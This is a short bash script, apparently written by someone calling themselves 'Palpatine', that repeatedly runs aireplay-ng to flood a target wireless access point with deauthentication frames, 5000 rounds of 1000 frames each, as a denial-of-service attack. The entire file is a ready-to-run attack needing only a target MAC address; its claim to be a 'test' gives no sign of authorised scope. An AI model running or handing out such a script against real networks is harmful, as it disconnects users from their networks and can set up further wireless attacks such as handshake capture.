#!/bin/bash
# Author :  Palpatine
# Date :    2022-05-01
# Purpose : To test the DOS attack on the wireless network

for i in {1..5000}
do

	aireplay-ng -deauth 1000 -a <target Mac Address>  wlan0mon

	sleep 60s
done
